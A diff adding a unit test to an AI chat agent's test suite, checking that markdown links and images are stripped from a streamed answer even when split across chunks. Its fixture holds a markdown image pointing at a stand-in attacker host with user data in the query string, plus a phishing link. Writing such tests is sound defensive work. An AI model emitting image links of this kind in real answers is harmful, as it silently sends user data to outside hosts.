@@ -118,6 +118,30 @@ class TestAgentLoop:
         assert len(history) == 2
         assert history[1].content == "The risk is Low."
 
+    def test_links_and_images_are_removed_as_the_answer_streams(
+        self, monkeypatch, metrics
+    ):
+        # The image arrives split across chunks, as a real stream would send it.
+        fake = _FakeLLM(
+            [
+                [
+                    _FakeChunk("Your rate is 34%. ![c"),
+                    _FakeChunk("](https://evil.exa"),
+                    _FakeChunk(
+                        "mple/p.png?d=34) See [this](http://phish.example) now."
+                    ),
+                ]
+            ]
+        )
+        self._patch_llm(monkeypatch, fake)
+
+        history = []
+        chunks = list(run_chat_turn("Summarise", history, metrics, _df()))
+
+        assert not any("://" in c for c in chunks)
+        assert "".join(chunks) == "Your rate is 34%. [image removed] See this now."
+        assert history[1].content == "".join(chunks)
+
     def test_unknown_tool_is_reported_not_fatal(self, monkeypatch, metrics):
         fake = _FakeLLM(
             [
